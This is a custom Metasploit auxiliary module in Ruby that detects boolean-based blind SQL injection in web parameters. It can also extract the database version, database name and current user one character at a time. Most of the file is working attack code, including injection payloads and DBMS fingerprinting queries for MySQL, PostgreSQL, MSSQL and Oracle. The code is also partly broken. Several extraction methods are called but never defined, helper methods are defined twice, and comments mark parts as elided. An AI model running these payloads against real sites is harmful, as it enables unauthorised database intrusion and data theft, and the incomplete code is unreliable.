##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HTTP SQL Injection Boolean-Based Blind Scanner (Clean Output)',
      'Description'    => %q{
        This module detects boolean-based blind SQL injection vulnerabilities by
        analyzing response differences between true and false conditions.
        Clean output version with minimal verbose messages.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://owasp.org/www-community/attacks/Blind_SQL_Injection']
        ]
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI to test', '/']),
      OptString.new('PARAMETERS', [true, 'Parameters to test (comma-separated)', 'id']),
      OptString.new('METHOD', [true, 'HTTP method to use', 'GET']),
      OptString.new('COOKIE', [false, 'Cookie header for authentication', '']),
      OptString.new('POST_DATA', [false, 'POST data (for POST requests)', '']),
      OptString.new('GET_PARAMS', [false, 'Additional GET parameters', '']),
      OptString.new('TRUE_PATTERN', [false, 'Pattern that indicates TRUE condition', '']),
      OptString.new('FALSE_PATTERN', [false, 'Pattern that indicates FALSE condition', '']),
      OptBool.new('AUTO_DETECT', [true, 'Auto-detect true/false patterns', true]),
      OptBool.new('EXTRACT_DATA', [false, 'Extract database information', false]),
      OptBool.new('QUICK_MODE', [false, 'Skip data extraction for faster scanning', false]),
      OptInt.new('MAX_EXTRACT_LENGTH', [true, 'Maximum length to extract', 50]),
      OptEnum.new('DBMS', [true, 'Target DBMS', 'auto', 
                  ['auto', 'MySQL', 'PostgreSQL', 'MSSQL', 'Oracle']]),
      OptEnum.new('INJECTION_TYPE', [true, 'Injection context', 'string', 
                  ['string', 'numeric']]),
      OptBool.new('USE_CACHE', [true, 'Cache responses for performance', true]),
      OptInt.new('REQUEST_DELAY', [true, 'Delay between requests (ms)', 100]),
      OptBool.new('BINARY_SEARCH', [true, 'Use binary search for extraction', true]),
      OptEnum.new('VERBOSE_LEVEL', [true, 'Verbose output level', 'normal', 
                  ['quiet', 'normal', 'debug']]),
      OptBool.new('SHOW_PROGRESS', [true, 'Show extraction progress', true])
    ])
    
    # Initialize cache
    @response_cache = {}
  end

  def run_host(ip)
    @true_pattern = nil
    @false_pattern = nil
    @baseline_response = nil
    @dbms_detected = nil
    
    print_status("Testing #{ip} for boolean-based blind SQL injection")
    
    # Test connection
    unless test_connection
      print_error("Connection failed")
      return
    end
    
    print_good("Connection successful - Response code: #{@baseline_response.code}")
    
    # Auto-detect patterns if enabled
    if datastore['AUTO_DETECT']
      unless auto_detect_patterns_enhanced
        print_error("Could not auto-detect true/false patterns")
        print_status("Please set TRUE_PATTERN and FALSE_PATTERN manually")
        return
      end
    else
      @true_pattern = datastore['TRUE_PATTERN']
      @false_pattern = datastore['FALSE_PATTERN']
      
      if @true_pattern.empty? && @false_pattern.empty?
        print_error("Either AUTO_DETECT must be true, or TRUE_PATTERN/FALSE_PATTERN must be set")
        return
      end
    end
    
    # Test each parameter
    params = datastore['PARAMETERS'].split(',').map(&:strip)
    
    params.each do |param|
      print_status("Testing parameter: #{param}")
      test_parameter(param)
    end
  end

  def test_connection
    begin
      param = datastore['PARAMETERS'].split(',').first.strip
      @baseline_response = send_request(param, '1')
      return @baseline_response && @baseline_response.code == 200
    rescue => e
      print_error("Connection test failed: #{e.message}") if verbose_debug?
      return false
    end
  end

  def auto_detect_patterns_enhanced
    print_status("Auto-detecting true/false response patterns...")
    
    param = datastore['PARAMETERS'].split(',').first.strip
    
    # Test multiple scenarios
    test_cases = [
      { value: '1', description: 'Valid ID' },
      { value: '999999', description: 'Invalid ID' },
      { value: "1' AND '1'='1", description: 'True condition' },
      { value: "1' AND '1'='2", description: 'False condition' }
    ]
    
    responses = {}
    test_cases.each do |test|
      response = send_request(param, test[:value])
      responses[test[:description]] = {
        response: response,
        length: response&.body&.length || 0,
        code: response&.code || 0
      }
      sleep(0.2) # Small delay between requests
    end
    
    # Analyze patterns
    valid_response = responses['Valid ID']
    invalid_response = responses['Invalid ID']
    
    return false unless valid_response && invalid_response
    
    # Check content length difference
    length_diff = (valid_response[:length] - invalid_response[:length]).abs
    if length_diff > 50
      @true_pattern = "CONTENTLENGTH:#{valid_response[:length]}"
      @false_pattern = "CONTENTLENGTH:#{invalid_response[:length]}"
      print_good("Detected content length pattern (#{length_diff} bytes)")
      return true
    end
    
    # Check for common text patterns
    common_patterns = [
      { true: /User ID exists|exists|success|found|valid/i, 
        false: /User ID is MISSING|missing|error|not found|invalid/i },
      { true: /admin|user|data|result/i,
        false: /no results|not exist|failed/i }
    ]
    
    common_patterns.each do |pattern|
      if valid_response[:response].body =~ pattern[:true] && 
         invalid_response[:response].body =~ pattern[:false]
        @true_pattern = pattern[:true].source
        @false_pattern = pattern[:false].source
        print_good("Detected text pattern")
        return true
      end
    end
    
    # Check HTTP status codes
    if valid_response[:code] != invalid_response[:code]
      @true_pattern = "STATUSCODE:#{valid_response[:code]}"
      @false_pattern = "STATUSCODE:#{invalid_response[:code]}"
      print_good("Detected status code pattern: #{valid_response[:code]}/#{invalid_response[:code]}")
      return true
    end
    
    print_error("Could not detect reliable patterns")
    false
  end

  def test_parameter(param)
    vulnerable = false
    pass_count = 0
    total_tests = 0
    
    # Detect DBMS if auto mode
    if datastore['DBMS'] == 'auto'
      @dbms_detected = detect_dbms_improved(param)
      if @dbms_detected
        print_good("Detected DBMS: #{@dbms_detected}")
      else
        print_status("DBMS auto-detection failed, using generic payloads")
        @dbms_detected = 'MySQL'  # Default fallback
      end
    else
      @dbms_detected = datastore['DBMS']
    end
    
    # Test with various boolean conditions
    tests = generate_test_cases(param)
    
    tests.each do |test|
      total_tests += 1
      
      print_status("Testing: #{test[:name]}") if verbose_normal?
      
      result = test_boolean_condition_cached(param, test[:payload], test[:expected])
      
      if result
        print_good("✓ #{test[:name]}") if verbose_normal?
        pass_count += 1
      else
        print_error("✗ #{test[:name]}") if verbose_normal?
      end
      
      sleep(datastore['REQUEST_DELAY'] / 1000.0) if datastore['REQUEST_DELAY'] > 0
    end
    
    # Calculate success rate
    success_rate = (pass_count.to_f / total_tests * 100).round(1)
    print_status("Boolean tests: #{pass_count}/#{total_tests} passed (#{success_rate}%)")
    
    # Consider vulnerable if >= 75% tests pass
    if success_rate >= 75.0
      print_good("✅ VULNERABLE: #{rhost} - Parameter '#{param}'")
      vulnerable = true
      
      report_vuln(
        host: rhost,
        port: rport,
        proto: 'tcp',
        name: 'Boolean-Based Blind SQL Injection',
        info: "Parameter '#{param}' vulnerable (#{success_rate}% confidence)",
        refs: references
      )
      
      # Extract data if enabled
      if datastore['EXTRACT_DATA'] && !datastore['QUICK_MODE']
        print_status("Attempting to extract basic information...")
        extract_database_info(param)
      end
    else
      print_error("✗ NOT VULNERABLE: #{rhost} - Parameter '#{param}' (#{success_rate}% confidence)")
    end
    
    vulnerable
  end

  def detect_dbms_improved(param)
    print_status("Attempting to detect DBMS type...") if verbose_normal?
    
    detection_queries = {
      'MySQL' => [
        "1' AND @@version_comment LIKE '%'",
        "1' AND MID(@@version,1,1)=@@version",
        "1' AND @@version IS NOT NULL"
      ],
      'PostgreSQL' => [
        "1' AND version() IS NOT NULL",
        "1' AND current_setting('server_version') IS NOT NULL"
      ],
      'MSSQL' => [
        "1' AND @@VERSION IS NOT NULL", 
        "1' AND SERVERPROPERTY('ProductVersion') IS NOT NULL"
      ],
      'Oracle' => [
        "1' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL",
        "1' AND ORA_HASH('test') IS NOT NULL"
      ]
    }
    
    detection_queries.each do |dbms, queries|
      queries.each do |query|
        payload = build_payload(query)
        if test_boolean_condition_cached(param, payload, :true)
          return dbms
        end
      end
    end
    
    nil
  end

  def generate_test_cases(param)
    tests = []
    
    # Basic AND tests
    tests << { name: 'AND 1=1', payload: build_payload("1' AND 1=1"), expected: :true }
    tests << { name: 'AND 1=2', payload: build_payload("1' AND 1=2"), expected: :false }
    
    # OR tests with non-existent ID
    tests << { name: 'OR 1=1', payload: build_payload("999999' OR 1=1"), expected: :true }
    tests << { name: 'OR 1=2', payload: build_payload("999999' OR 1=2"), expected: :false }
    
    # Alternative comment syntax
    tests << { name: 'AND 1=1 with #', payload: build_payload("1' AND 1=1", '#'), expected: :true }
    tests << { name: 'AND 1=2 with #', payload: build_payload("1' AND 1=2", '#'), expected: :false }
    
    # String comparison
    tests << { name: "AND 'a'='a'", payload: build_payload("1' AND 'a'='a'"), expected: :true }
    tests << { name: "AND 'a'='b'", payload: build_payload("1' AND 'a'='b'"), expected: :false }
    
    # DBMS-specific tests
    case @dbms_detected
    when 'MySQL'
      tests << { name: 'MySQL SUBSTRING true', payload: build_payload("1' AND SUBSTRING(VERSION(),1,1)>'0'"), expected: :true }
      tests << { name: 'MySQL SUBSTRING false', payload: build_payload("1' AND SUBSTRING(VERSION(),1,1)>'9'"), expected: :false }
    end
    
    tests
  end

  def build_payload(condition, comment_type = '--')
    prefix = datastore['INJECTION_TYPE'] == 'string' ? "1' " : "1 "
    
    case comment_type
    when '#'
      return "#{condition} #{comment_type}"
    else
      return "#{condition} -- -"
    end
  end

  def test_boolean_condition_cached(param, payload, expected)
    # Use cache if enabled
    cache_key = "#{param}::#{payload}"
    
    if datastore['USE_CACHE'] && @response_cache.key?(cache_key)
      vprint_debug("Using cached response for: #{payload[0..50]}...")
      return @response_cache[cache_key]
    end
    
    # Original logic
    result = test_boolean_condition(param, payload, expected)
    
    # Cache the result
    @response_cache[cache_key] = result if datastore['USE_CACHE']
    
    result
  end

  def test_boolean_condition(param, payload, expected)
    response = send_request(param, payload)
    return false unless response
    
    result = matches_pattern?(response, expected)
    
    # CHỈ HIỂN THỊ TRONG CHẾ ĐỘ DEBUG
    vprint_debug("  Response: #{response.code}, Expected: #{expected}, Result: #{result}")
    
    result
  end

  def matches_pattern?(response, expected)
    if @true_pattern && @true_pattern.start_with?('CONTENTLENGTH:')
      expected_length = @true_pattern.split(':')[1].to_i
      threshold = expected_length * 0.9
      
      case expected
      when :true
        return response.body.length >= threshold
      when :false
        return response.body.length < threshold
      end
    elsif @true_pattern && @false_pattern
      case expected
      when :true
        return response.body =~ /#{@true_pattern}/i
      when :false
        return response.body =~ /#{@false_pattern}/i || !(response.body =~ /#{@true_pattern}/i)
      end
    end
    
    false
  end

  def extract_database_info(param)
    case @dbms_detected
    when 'MySQL'
      extract_mysql_info(param)
    when 'PostgreSQL'
      extract_postgresql_info(param)
    when 'MSSQL'
      extract_mssql_info(param)
    when 'Oracle'
      extract_oracle_info(param)
    end
  end

  def extract_mysql_info(param)
    # Extract version
    print_status("Extracting MySQL version...")
    version = extract_string_optimized(param, 'VERSION()', 20)
    print_good("🗄️  Database version: #{version}") if version
    
    # Extract database name
    print_status("Extracting database name...")
    db_name = extract_string_optimized(param, 'DATABASE()', 30)
    print_good("📊 Database name: #{db_name}") if db_name
    
    # Extract current user
    print_status("Extracting current user...")
    user = extract_string_optimized(param, 'CURRENT_USER()', 50)
    print_good("👤 Current user: #{user}") if user
  end

  def extract_string_optimized(param, function, max_length)
    print_status("Extracting: #{function}")
    
    # Determine length with binary search
    actual_length = binary_search_length(param, function, max_length)
    return nil if actual_length.zero?
    
    print_good("Length detected: #{actual_length}")
    
    # Extract with clean progress
    result = ""
    start_time = Time.now
    
    (1..actual_length).each do |position|
      char = if datastore['BINARY_SEARCH']
               extract_character_optimized(param, function, position)
             else
               extract_character(param, function, position)
             end
      
      if char
        result += char
        
        # Show progress only when enabled and at milestones
        if datastore['SHOW_PROGRESS']
          progress = (position.to_f / actual_length * 100).round(1)
          elapsed = Time.now - start_time
          estimated_total = (elapsed / position * actual_length).round(1)
          remaining = (estimated_total - elapsed).round(1)
          
          # Only show progress at 25%, 50%, 75%, 100% or every 10 chars for long strings
          if position == actual_length || progress % 25 == 0 || (actual_length > 20 && position % 10 == 0)
            print_status("Progress: #{progress}% (#{position}/#{actual_length}) - #{result} - ETA: #{remaining}s")
          end
        end
      else
        print_error("Failed at position #{position}") if verbose_normal?
        break
      end
      
      # Respect delay
      sleep(datastore['REQUEST_DELAY'] / 1000.0) if datastore['REQUEST_DELAY'] > 0
    end
    
    print_good("Extraction completed: #{result}")
    result
  end

  def binary_search_length(param, function, max_length)
    low = 0
    high = max_length
    found_length = 0
    
    while low <= high
      mid = (low + high) / 2
      
      payload = case @dbms_detected
      when 'MySQL'
        build_payload("1' AND LENGTH(#{function})>#{mid}")
      when 'PostgreSQL'
        build_payload("1' AND LENGTH(#{function})>#{mid}")
      when 'MSSQL'
        build_payload("1' AND LEN(#{function})>#{mid}")
      when 'Oracle'
        build_payload("1' AND LENGTH(#{function})>#{mid}")
      end
      
      if test_boolean_condition_cached(param, payload, :true)
        found_length = mid + 1
        low = mid + 1
      else
        high = mid - 1
      end
    end
    
    found_length
  end

  def extract_character_optimized(param, function, position)
    # Binary search for ASCII value - SILENT OPERATION
    low = 32
    high = 126
    
    while low <= high
      mid = (low + high) / 2
      
      payload = case @dbms_detected
      when 'MySQL'
        build_payload("1' AND ASCII(SUBSTRING(#{function},#{position},1))>#{mid}")
      when 'PostgreSQL'
        build_payload("1' AND ASCII(SUBSTRING(#{function},#{position},1))>#{mid}")
      when 'MSSQL'
        build_payload("1' AND ASCII(SUBSTRING(#{function},#{position},1))>#{mid}")
      when 'Oracle'
        build_payload("1' AND ASCII(SUBSTR(#{function},#{position},1))>#{mid}")
      end
      
      if test_boolean_condition_cached(param, payload, :true)
        low = mid + 1
      else
        high = mid - 1
      end
    end
    
    # Now low is the exact ASCII value
    ascii_value = low
    return ascii_value.chr if ascii_value.between?(32, 126)
    
    nil
  rescue => e
    print_error("Character extraction failed: #{e.message}") if verbose_debug?
    nil
  end

  # ... CÁC HÀM KHÁC GIỮ NGUYÊN ...

  # Helper methods for verbose levels
  def verbose_quiet?
    datastore['VERBOSE_LEVEL'] == 'quiet'
  end

  def verbose_normal?
    datastore['VERBOSE_LEVEL'] == 'normal'
  end

  def verbose_debug?
    datastore['VERBOSE_LEVEL'] == 'debug'
  end

  def vprint_debug(msg)
    print_status(msg) if verbose_debug?
  end

  def vprint_status(msg)
    print_status(msg) unless verbose_quiet?
  end

  def vprint_good(msg)
    print_good(msg) unless verbose_quiet?
  end

  def vprint_error(msg)
    print_error(msg) unless verbose_quiet?
  end

def send_request(param, value)
    uri = normalize_uri(target_uri.path)
    method = datastore['METHOD'].upcase
    
    begin
      if method == 'GET'
        vars_get = { param => value }
        
        # Add additional GET parameters
        if datastore['GET_PARAMS'] && !datastore['GET_PARAMS'].empty?
          additional = parse_get_params
          vars_get.merge!(additional)
        end
        
        res = send_request_cgi(
          'uri'      => uri,
          'method'   => 'GET',
          'vars_get' => vars_get,
          'headers'  => get_headers
        )
      else
        vars_post = parse_post_data
        vars_post[param] = value
        
        res = send_request_cgi(
          'uri'       => uri,
          'method'    => 'POST',
          'vars_post' => vars_post,
          'headers'   => get_headers
        )
      end
      
      return res
    rescue => e
      vprint_error("Request error: #{e.message}")
      return nil
    end
  end

  def parse_get_params
    params = {}
    if datastore['GET_PARAMS'] && !datastore['GET_PARAMS'].empty?
      datastore['GET_PARAMS'].split('&').each do |param|
        key, value = param.split('=', 2)
        params[key] = value if key
      end
    end
    params
  end

  def parse_post_data
    params = {}
    if datastore['POST_DATA'] && !datastore['POST_DATA'].empty?
      datastore['POST_DATA'].split('&').each do |param|
        key, value = param.split('=', 2)
        params[key] = value if key
      end
    end
    params
  end

  def get_headers
    headers = {}
    if datastore['COOKIE'] && !datastore['COOKIE'].empty?
      headers['Cookie'] = datastore['COOKIE']
    end
    if datastore['VHOST'] && !datastore['VHOST'].empty?
      headers['Host'] = datastore['VHOST']
    end
    headers
  end

  def vprint_status(msg)
    print_status(msg) if datastore['VERBOSE']
  end
  
  def vprint_good(msg)
    print_good(msg) if datastore['VERBOSE']
  end
  
  def vprint_error(msg)
    print_error(msg) if datastore['VERBOSE']
  end
  # ... CÁC HÀM send_request, parse_get_params, etc. GIỮ NGUYÊN ...
end
        
